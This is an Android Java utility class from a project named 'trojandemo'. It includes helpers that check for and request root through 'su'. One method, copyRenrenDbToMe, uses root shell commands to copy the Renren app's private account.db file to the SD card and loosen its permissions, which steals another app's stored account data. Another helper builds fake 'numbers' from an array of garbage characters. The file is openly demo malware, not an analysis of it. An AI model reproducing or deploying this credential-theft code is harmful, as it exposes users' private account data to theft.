package com.singuloid.trojandemo.utils;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.util.Random;

/**
 * Created by administrator on 14-9-12.
 */
public class Utils {
    Context mContext;
    ProgressDialog progress_dialog;
    private static final String[] LUANMAKU = new String[]{"蹿", "鬟", "f", "亇", "€", "t", "裦", "", "", "税", "槔", "f", "答", "楱", "榘", "€", "鶂", "f", "亇",
            "€", "阔", "榝", "", "?", "?", "魼", "?", "", "鐄", "", "^", "?", "", "湗", "X", "钭", "娨", "I", "%", "=", "!", "F", "j", "瞋", "赉", "簖", "?", "暔", "r", "噢", "?",
            "鼊", ">", "<", "闚", "?", "", "?", "翷", "1", "?", "留", "?", "$", "获", "縥", "g", "峌", "瘴", "麱", "濔", "!", "<", "V", "蓈", "煦", "妪", "?", "h", "橬", "#", "嵷", "R", "踯", "鵺", "v"};

    public Utils(Context context){
        this.mContext = context;
    }
    // 获取ROOT权限
    public void get_root(){

        if (is_root()){
            Toast.makeText(mContext, "已经具有ROOT权限!", Toast.LENGTH_LONG).show();
        }
        else{
            try{
                progress_dialog = ProgressDialog.show(mContext,
                        "ROOT", "正在获取ROOT权限...", true, false);
                Runtime.getRuntime().exec("su");
            }
            catch (Exception e){
                Toast.makeText(mContext, "获取ROOT权限时出错!", Toast.LENGTH_LONG).show();
            }
        }

    }
    // 判断是否具有ROOT权限
    public static boolean is_root() {

        boolean res = false;

        try {
            if ((!new File("/system/bin/su").exists()) &&
                    (!new File("/system/xbin/su").exists())) {
                res = false;
            } else {
                res = true;
            }
        } catch (Exception e) {

        }
        return res;
    }



    public static void copyRenrenDbToMe() throws IOException {
        Process process = Runtime.getRuntime().exec("su");
        DataOutputStream out = new DataOutputStream(process.getOutputStream());
//        out.writeBytes("mkdir -p /data/data/com.singuloid.trojandemo/databases\n");
        out.writeBytes("mkdir -p /sdcard/mydatabases\n");
//        out.writeBytes("cat /data/data/com.renren.mobile.android/databases/account.db > /data/data/com.singuloid.trojandemo/databases/account.db\n");
        out.writeBytes("cat /data/data/com.renren.mobile.android/databases/account.db > /sdcard/account.db\n");
        out.writeBytes("chmod 777 /data/data/com.singuloid.trojandemo/databases/account.db\n");
//        out.writeBytes("chown system:sdcard_r /sdcard/account.db\n");
        out.writeBytes("exit\n");
        out.flush();
        try {
            process.waitFor();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    public static String getFakeNumber(int num) {
        StringBuilder str = new StringBuilder();

        for (int i = 0; i < num; i++) {
            str.append(LUANMAKU[(new Random()).nextInt(LUANMAKU.length)]);
        }

        return str.toString();
    }

    public static void dialog(final Context context, final Activity activity,String str) {
        AlertDialog.Builder builder = new AlertDialog.Builder(context);
        builder.setTitle("ERROR");
        builder.setMessage(str);
        builder.setNeutralButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                activity.finish();
            }
        });
        builder.create().show();
    }
}
